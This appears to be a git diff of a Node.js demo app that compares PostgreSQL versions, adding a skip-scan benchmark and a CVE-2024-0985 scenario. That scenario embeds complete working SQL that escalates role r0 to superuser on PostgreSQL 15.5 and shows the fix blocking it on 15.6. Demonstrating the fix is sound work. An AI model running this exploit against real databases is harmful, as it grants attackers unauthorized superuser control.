@@ -18,6 +18,17 @@ const SEC = {
   new: { id: 'sec-new', host: process.env.SEC_NEW_HOST || 'pg18-security', label: 'PostgreSQL 18', service: 'pg18-security' },
 };
 
+// Security, second scenario: CVE-2024-0985 (REFRESH MATERIALIZED VIEW
+// CONCURRENTLY privilege escalation). A same-major, minor-version-only
+// pair on purpose -- see security/init-cve.sql and docker-compose.yml --
+// unlike SEC above, which compares major versions. `database: 'rdb'`
+// because every object this scenario touches (role r0's own database)
+// lives there, not in the default `postgres` database the other pools use.
+const CVE = {
+  old: { id: 'cve-old', host: process.env.CVE_OLD_HOST || 'pg15-5-security', label: 'PostgreSQL 15.5', service: 'pg15-5-security', database: 'rdb' },
+  new: { id: 'cve-new', host: process.env.CVE_NEW_HOST || 'pg15-6-security', label: 'PostgreSQL 15.6', service: 'pg15-6-security', database: 'rdb' },
+};
+
 // Performance: same benchmark table, same mem_limit/shared_buffers -- only
 // io_method differs (PG17 has no such knob at all).
 const PERF = {
@@ -66,6 +77,7 @@ CREATE SUBSCRIPTION sub
 
 const ALL_PG_NODES = [
   SEC.old, SEC.new,
+  CVE.old, CVE.new,
   PERF.old, PERF.new,
   REL.old.primary, REL.old.standby, REL.old.subscriber,
   REL.new.primary, REL.new.standby, REL.new.subscriber,
@@ -81,13 +93,13 @@ const PG_SUPERUSER_PASSWORD = 'postgres';
 
 const pools = new Map();
 for (const n of ALL_PG_NODES) {
-  const pool = new Pool({ host: n.host, port: 5432, user: 'postgres', password: PG_SUPERUSER_PASSWORD, database: 'postgres', max: 5, connectionTimeoutMillis: 4000 });
+  const pool = new Pool({ host: n.host, port: 5432, user: 'postgres', password: PG_SUPERUSER_PASSWORD, database: n.database || 'postgres', max: 5, connectionTimeoutMillis: 4000 });
   pool.on('error', (err) => console.error(`[app] pool error on ${n.id}:`, err.message));
   pools.set(n.id, pool);
 }
 
 function nodeConnInfo(n, overrides) {
-  return Object.assign({ host: n.host, port: 5432, user: 'postgres', password: PG_SUPERUSER_PASSWORD, database: 'postgres', connectionTimeoutMillis: 4000 }, overrides || {});
+  return Object.assign({ host: n.host, port: 5432, user: 'postgres', password: PG_SUPERUSER_PASSWORD, database: n.database || 'postgres', connectionTimeoutMillis: 4000 }, overrides || {});
 }
 
 // --- Docker control ----------------------------------------------------------
@@ -243,23 +255,54 @@ async function bootstrapReliabilityNew(rel) {
 }
 
 // --- Performance bootstrap ---------------------------------------------------
-// Same seed on both nodes: a table comfortably larger than shared_buffers
-// (128MB, see docker-compose.yml) and than the 768MB container memory cap,
-// so a full scan is genuinely I/O-bound rather than served from cache.
+// Same seed on both nodes. `payload`/`val`/`bench_val_idx` are vestigial --
+// they backed this tab's earlier async-I/O scenarios (bitmap heap scan,
+// sequential scan), which got dropped because they need slow storage to
+// show any difference on typical Docker Desktop hardware. Left in place
+// rather than migrated out, so a fresh provision and this project's
+// already-seeded volumes stay schema-identical.
+//
+// tenant_id/serial_no are what the one scenario left (skip scan) actually
+// uses: a low-cardinality leading column (tenant_id, 20 values) plus a
+// highly selective trailing column (serial_no, effectively unique) with
+// ONLY a composite index across both -- no standalone index on serial_no.
+// That's the exact shape PG18's B-tree skip scan targets: a query with no
+// predicate on the leading column at all.
 async function seedPerformance(node) {
   const pool = pools.get(node.id);
   const existing = await pool.query('SELECT to_regclass($1) AS t', ['public.bench']);
   if (existing.rows[0].t) return;
   console.log(`[app] seeding benchmark table on ${node.id} (this takes a while on first boot)...`);
   await pool.query(`
-    CREATE TABLE bench (id bigint PRIMARY KEY, payload text, val int);
+    CREATE TABLE bench (id bigint PRIMARY KEY, payload text, val int, tenant_id int, serial_no bigint);
     INSERT INTO bench
-      SELECT g, repeat('x', 200), (random() * 1000000)::int
+      SELECT g, repeat('x', 200), (random() * 1000000)::int, ((g - 1) % 20) + 1, g
       FROM generate_series(1, 12000000) g;
     CREATE INDEX bench_val_idx ON bench (val);
+    CREATE INDEX bench_tenant_serial_idx ON bench (tenant_id, serial_no);
     ANALYZE bench;
   `);
   console.log(`[app] benchmark table ready on ${node.id}`);
+}
+
+// Older deployments already have `bench` seeded without tenant_id/serial_no
+// (this scenario was added after the initial seed) -- backfill those in
+// place rather than requiring a full reset. A fresh seedPerformance() above
+// already includes them, so this is a no-op there.
+async function ensureSkipScanColumns(node) {
+  const pool = pools.get(node.id);
+  const existing = await pool.query(
+    "SELECT 1 FROM information_schema.columns WHERE table_name = 'bench' AND column_name = 'tenant_id'"
+  );
+  if (existing.rowCount > 0) return;
+  console.log(`[app] backfilling skip-scan demo columns on ${node.id} (this takes a while)...`);
+  await pool.query(`
+    ALTER TABLE bench ADD COLUMN tenant_id int, ADD COLUMN serial_no bigint;
+    UPDATE bench SET tenant_id = ((id - 1) % 20) + 1, serial_no = id;
+    CREATE INDEX bench_tenant_serial_idx ON bench (tenant_id, serial_no);
+    ANALYZE bench;
+  `);
+  console.log(`[app] skip-scan demo columns ready on ${node.id}`);
 }
 
 async function bootstrapAll() {
@@ -270,6 +313,7 @@ async function bootstrapAll() {
   await bootstrapReliabilityOld(REL.old);
   await bootstrapReliabilityNew(REL.new);
   await Promise.all([seedPerformance(PERF.old), seedPerformance(PERF.new)]);
+  await Promise.all([ensureSkipScanColumns(PERF.old), ensureSkipScanColumns(PERF.new)]);
 }
 
 let bootstrapDone = false;
@@ -406,24 +450,167 @@ app.post(
   })
 );
 
-// ---- Performance ---------------------------------------------------------------
-async function performanceStatus(node) {
-  const pool = pools.get(node.id);
-  const ioMethod = await pool.query('SHOW io_method').catch(() => ({ rows: [{ io_method: 'n/a (introduced in PG18)' }] }));
-  const sharedBuffers = await pool.query('SHOW shared_buffers');
-  const seeded = await pool.query("SELECT to_regclass('public.bench') AS t");
+// ---- Security, second scenario: CVE-2024-0985 --------------------------------
+// REFRESH MATERIALIZED VIEW CONCURRENTLY is meant to run functions inside the
+// view's definition as the view's *owner*, not the (often more privileged)
+// user issuing the REFRESH -- that's the whole point, it lets a privileged
+// user safely refresh a view someone else created. The bug: while building
+// its own internal temp table, Postgres briefly leaves security-restricted
+// mode, and the attacker's materialized view (via a deferred constraint
+// trigger + a CREATE RULE trick that converts that temp table into a view)
+// hijacks that moment to run SQL as the REFRESH caller instead. Verified by
+// hand against real postgres:15.5 and postgres:15.6 containers: identical
+// setup escalates role r0 to superuser on 15.5, and fails with a clean
+// "is not a table" error -- no escalation -- on 15.6.
+async function cveStatus(cve) {
+  const pool = pools.get(cve.id);
+  const role = await pool.query("SELECT rolsuper FROM pg_roles WHERE rolname = 'r0'").catch(() => ({ rows: [{}] }));
+  const mv = await pool.query("SELECT to_regclass('public.mv') AS t");
   return {
-    id: node.id,
-    label: node.label,
-    ioMethod: ioMethod.rows[0].io_method,
-    sharedBuffers: sharedBuffers.rows[0].shared_buffers,
-    seeded: !!seeded.rows[0].t,
+    id: cve.id,
+    label: cve.label,
+    rolsuper: role.rows[0] ? role.rows[0].rolsuper : null,
+    hasMv: !!mv.rows[0].t,
   };
 }
 
-app.get('/api/performance/scenarios', (req, res) => {
-  res.json(Object.fromEntries(Object.entries(PERF_SCENARIOS).map(([id, s]) => [id, { label: s.label, sql: s.sql }])));
-});
+app.get(
+  '/api/cve/status',
+  asyncRoute(async (req, res) => {
+    const [old, neu] = await Promise.all([cveStatus(CVE.old), cveStatus(CVE.new)]);
+    res.json({ old, new: neu });
+  })
+);
+
+const CVE_SQL = {
+  attack: `CREATE FUNCTION pwn() RETURNS trigger AS $$
+BEGIN
+    IF current_setting('is_superuser')::text = 'on' THEN
+        ALTER USER r0 SUPERUSER;
+    END IF;
+    DROP VIEW IF EXISTS remove_later;
+    RETURN NEW;
+END $$ LANGUAGE plpgsql;
+
+CREATE TABLE t1(i INTEGER);
+CREATE CONSTRAINT TRIGGER trig
+    AFTER INSERT ON t1
+    INITIALLY DEFERRED
+    FOR EACH ROW EXECUTE PROCEDURE pwn();
+
+CREATE FUNCTION get_target() RETURNS TEXT AS $$
+    SELECT format('%I.%I',
+      pg_my_temp_schema()::regnamespace,
+      'pg_temp_' || 'mv'::text::regclass::oid
+    );
+$$ LANGUAGE SQL STABLE;
+
+CREATE FUNCTION attack() RETURNS INTEGER AS $$
+DECLARE
+  target TEXT := get_target();
+BEGIN
+    BEGIN
+        INSERT INTO t1 VALUES (1);
+        EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
+        EXECUTE format('CREATE TEMP TABLE %s()', target);
+    EXCEPTION WHEN OTHERS THEN
+    END;
+    RETURN 2;
+END $$ LANGUAGE plpgsql;
+
+CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
+DECLARE
+    target TEXT := get_target();
+BEGIN
+    IF to_regclass(target) IS NOT NULL THEN
+        EXECUTE format(
+          'CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD '
+          'SELECT attack() AS i, 1 as x', target
+        );
+        EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
+    END IF;
+    RETURN;
+END $$ LANGUAGE plpgsql;
+
+CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
+CREATE UNIQUE INDEX ix_mv_i ON mv (i);`,
+  refresh: `REFRESH MATERIALIZED VIEW CONCURRENTLY mv;`,
+  reset: `DROP MATERIALIZED VIEW IF EXISTS mv CASCADE;
+DROP FUNCTION IF EXISTS conv() CASCADE;
+DROP FUNCTION IF EXISTS attack() CASCADE;
+DROP FUNCTION IF EXISTS get_target() CASCADE;
+DROP FUNCTION IF EXISTS pwn() CASCADE;
+DROP TABLE IF EXISTS t1 CASCADE;
+DROP VIEW IF EXISTS remove_later CASCADE;
+ALTER USER r0 NOSUPERUSER;`,
+};
+
+// Step 1: the low-priv attacker (role r0, owner of its own database rdb --
+// an ordinary onboarding step, not a special grant) plants the malicious
+// materialized view. This step succeeds on BOTH versions -- there's nothing
+// for the fix to block here, it's just setup.
+app.post(
+  '/api/cve/attack',
+  asyncRoute(async (req, res) => {
+    const target = req.body.target === 'new' ? CVE.new : CVE.old;
+    const client = new Client(nodeConnInfo(target, { user: 'r0', password: 'r0' }));
+    await client.connect();
+    try {
+      await client.query(CVE_SQL.attack);
+      res.json({ ok: true, blocked: false, sql: CVE_SQL.attack, ranAs: 'r0' });
+    } catch (err) {
+      res.json({ ok: false, blocked: true, error: err.message, sql: CVE_SQL.attack, ranAs: 'r0' });
+    } finally {
+      await client.end().catch(() => {});
+    }
+  })
+);
+
+// Step 2: an ordinary admin task -- refreshing a materialized view someone
+// else owns is exactly what REFRESH MATERIALIZED VIEW CONCURRENTLY exists
+// to do safely. On 15.5 this silently makes r0 superuser; on 15.6 it fails
+// with a clean error instead (the fix), which is where this scenario's
+// "blocked" moment actually is -- the opposite step from the tab's other
+// scenario above.
+app.post(
+  '/api/cve/refresh',
+  asyncRoute(async (req, res) => {
+    const target = req.body.target === 'new' ? CVE.new : CVE.old;
+    const pool = pools.get(target.id);
+    try {
+      await pool.query(CVE_SQL.refresh);
+      const after = await pool.query("SELECT rolsuper FROM pg_roles WHERE rolname = 'r0'");
+      res.json({ ok: true, blocked: false, rolsuper: after.rows[0].rolsuper, sql: CVE_SQL.refresh, ranAs: 'postgres' });
+    } catch (err) {
+      res.json({ ok: false, blocked: true, error: err.message, sql: CVE_SQL.refresh, ranAs: 'postgres' });
+    }
+  })
+);
+
+app.post(
+  '/api/cve/reset',
+  asyncRoute(async (req, res) => {
+    const target = req.body.target === 'new' ? CVE.new : CVE.old;
+    const pool = pools.get(target.id);
+    await pool.query(CVE_SQL.reset);
+    res.json({ ok: true, sql: CVE_SQL.reset, ranAs: 'postgres' });
+  })
+);
+
+// ---- Performance ---------------------------------------------------------------
+async function performanceStatus(node) {
+  const pool = pools.get(node.id);
+  const seeded = await pool.query("SELECT to_regclass('public.bench') AS t");
+  const skipScanReady = await pool.query(
+    "SELECT 1 FROM information_schema.columns WHERE table_name = 'bench' AND column_name = 'tenant_id'"
+  );
+  return {
+    id: node.id,
+    label: node.label,
+    seeded: !!seeded.rows[0].t,
+    skipScanReady: skipScanReady.rowCount > 0,
+  };
+}
 
 app.get(
   '/api/performance/status',
@@ -433,124 +620,54 @@ app.get(
   })
 );
 
-const PERF_SCENARIOS = {
-  seqscan: {
-    label: 'Sequential scan',
-    sql: 'SELECT count(*) FROM bench WHERE payload LIKE $1',
-    params: ['zzz-no-match-%'],
-  },
-  bitmap: {
-    label: 'Bitmap heap scan (0.2% selectivity)',
-    sql: 'SELECT count(*) FROM bench WHERE val BETWEEN 0 AND 2000',
-    params: [],
-  },
-};
+// The only scenario left in this tab: see the comment on
+// `bench_tenant_serial_idx` above for why this exact query shape (no
+// predicate on the composite index's leading column) is what PG18's B-tree
+// skip scan targets, and why it's a better fit here than the async-I/O
+// scenarios this tab used to also carry -- those needed slow storage to
+// show a difference (see git history), this doesn't.
+const SKIP_SCAN_SQL = 'SELECT count(*) FROM bench WHERE serial_no = $1';
+const SKIP_SCAN_PARAMS = [6000000];
 
-async function timedQuery(pool, sql, params, reps) {
+// Sums the buffer pages a plan actually touched (Postgres's own count, not
+// wall-clock) across every node in the plan tree -- the metric that makes
+// this scenario's win visible regardless of storage speed: it's the same
+// whether the read comes from a fast local disk or shared_buffers.
+function sumPlanBuffers(planNode) {
+  let total = (planNode['Shared Hit Blocks'] || 0) + (planNode['Shared Read Blocks'] || 0);
+  for (const child of planNode.Plans || []) total += sumPlanBuffers(child);
+  return total;
+}
+
+async function timedQueryWithBuffers(pool, sql, params, reps) {
   const timings = [];
+  const buffers = [];
   for (let i = 0; i < reps; i++) {
-    const t0 = Date.now();
-    await pool.query(sql, params);
-    timings.push(Date.now() - t0);
+    const r = await pool.query(`EXPLAIN (ANALYZE, BUFFERS, FORMAT JSON) ${sql}`, params);
+    const plan = r.rows[0]['QUERY PLAN'][0];
+    // Keep sub-ms precision -- this scenario is fast enough (sub-millisecond
+    // on PG18) that rounding to whole ms would show "0" and look broken.
+    timings.push(Math.round(plan['Execution Time'] * 100) / 100);
+    buffers.push(sumPlanBuffers(plan.Plan));
   }
-  return timings;
+  return { timings, buffers };
 }
-
-// ---- Disk throughput (Performance tab) --------------------------------------
-// Docker Desktop's virtual disk is fast enough that AIO's benefit (hiding
-// storage *latency*) barely shows up -- exactly the "honesty note" above.
-// Same fix as this project's sibling `pgd-cluster` demo uses for network
-// latency (`tc netem` on a node's own interface), just for disk: throttle
-// real bandwidth via the cgroup v2 "io" controller (`io.max`), scoped to
-// just the target container's own cgroup. Verified by hand that it actually
-// caps `dd` throughput inside the container (not a simulated sleep) and
-// that it does NOT throttle other containers sharing the same underlying
-// virtual disk -- blk-throttle limits are per-cgroup, not a shared bucket.
-//
-// Neither `docker update` (its --blkio-* flags predate the "io" controller
-// and it has no --device-*-bps flags at all) nor a plain `docker exec` can
-// reach this -- `io.max` lives in the *host's* cgroupfs, which the target
-// container's own mount namespace doesn't see. So this shells out to a
-// throwaway --privileged --pid=host container that nsenters into the real
-// host (the Docker Desktop VM) to read/write it directly -- the same
-// "docker-outside-of-docker" trick this file's socket mount already relies
-// on elsewhere, just reaching one level deeper (the VM, not a sibling
-// container).
-//
-// Known limitation, not fixed: like netem, this lives in the container's
-// cgroup, not its data volume, so restarting/recreating pg17/pg18-
-// performance resets the limit to unlimited -- reapply from here afterward
-// if a throttled run suddenly looks fast again.
-const DISK_LIMIT_OPTIONS_MBPS = [0, 200, 50, 10];
-let currentDiskLimitMbps = 0;
-
-let dockerRootDirCache = null;
-async function dockerRootDir() {
-  if (!dockerRootDirCache) {
-    const info = await dockerApiRequest('GET', '/info');
-    dockerRootDirCache = info.DockerRootDir;
-  }
-  return dockerRootDirCache;
-}
-
-async function applyDiskLimit(serviceName, mbps) {
-  const container = await findContainer(serviceName);
-  const root = await dockerRootDir();
-  const limitClause = mbps > 0 ? `rbps=${mbps * 1000000} wbps=${mbps * 1000000}` : 'rbps=max wbps=max';
-  // Derive the whole-disk device (blk-throttle policy lives on the gendisk,
-  // not a partition) backing the daemon's own storage root, then find this
-  // container's cgroup dir by id -- `*id*` rather than an exact match
-  // because the systemd cgroup driver names it `docker-<id>.scope`, not
-  // just `<id>` (this host uses the plain cgroupfs driver, but the wildcard
-  // costs nothing and keeps this from being silently host-specific).
-  const script = `
-    PART=$(mount | awk -v m='${root}' '$3==m{print $1}' | head -1)
-    BASE=$(basename "$PART" | sed -E 's/[0-9]+$//')
-    MAJMIN=$(cat /sys/class/block/$BASE/dev)
-    CGDIR=$(find /sys/fs/cgroup -maxdepth 4 -type d -name '*${container.Id}*' | head -1)
-    [ -n "$CGDIR" ] || { echo "cgroup dir not found for ${container.Id}" >&2; exit 1; }
-    echo "$MAJMIN ${limitClause}" > "$CGDIR/io.max"
-  `;
-  await runCmd('docker', [
-    'run', '--rm', '--privileged', '--pid=host', 'alpine',
-    'busybox', 'nsenter', '-t', '1', '-m', '-u', '-i', '-n', '--', 'sh', '-c', script,
-  ]);
-}
-
-app.get('/api/performance/disk-limit', (req, res) => {
-  res.json({ mbps: currentDiskLimitMbps, options: DISK_LIMIT_OPTIONS_MBPS });
-});
-
-app.post(
-  '/api/performance/disk-limit',
-  asyncRoute(async (req, res) => {
-    const mbps = Number((req.body || {}).mbps);
-    if (!DISK_LIMIT_OPTIONS_MBPS.includes(mbps)) {
-      throw Object.assign(new Error(`mbps must be one of: ${DISK_LIMIT_OPTIONS_MBPS.join(', ')}`), { status: 400 });
-    }
-    const targets = [PERF.old, PERF.new];
-    const results = await Promise.allSettled(targets.map((n) => applyDiskLimit(n.service, mbps)));
-    currentDiskLimitMbps = mbps;
-    const failed = results
-      .map((r, i) => (r.status === 'rejected' ? `${targets[i].id}: ${r.reason.message}` : null))
-      .filter(Boolean);
-    res.json({ ok: failed.length === 0, mbps, failed });
-  })
-);
 
 app.post(
   '/api/performance/run',
   asyncRoute(async (req, res) => {
-    const scenarioId = req.body.scenario || 'bitmap';
-    const scenario = PERF_SCENARIOS[scenarioId];
-    if (!scenario) throw Object.assign(new Error('unknown scenario'), { status: 400 });
     const reps = Math.min(Math.max(parseInt(req.body.reps, 10) || 3, 1), 6);
-
-    const [oldTimings, newTimings] = await Promise.all([
-      timedQuery(pools.get(PERF.old.id), scenario.sql, scenario.params, reps),
-      timedQuery(pools.get(PERF.new.id), scenario.sql, scenario.params, reps),
+    const [oldResult, newResult] = await Promise.all([
+      timedQueryWithBuffers(pools.get(PERF.old.id), SKIP_SCAN_SQL, SKIP_SCAN_PARAMS, reps),
+      timedQueryWithBuffers(pools.get(PERF.new.id), SKIP_SCAN_SQL, SKIP_SCAN_PARAMS, reps),
     ]);
-    res.json({ scenario: scenarioId, label: scenario.label, sql: scenario.sql, reps, old: oldTimings, new: newTimings });
+    res.json({
+      sql: SKIP_SCAN_SQL,
+      reps,
+      old: oldResult.timings,
+      new: newResult.timings,
+      buffers: { old: oldResult.buffers, new: newResult.buffers },
+    });
   })
 );
 
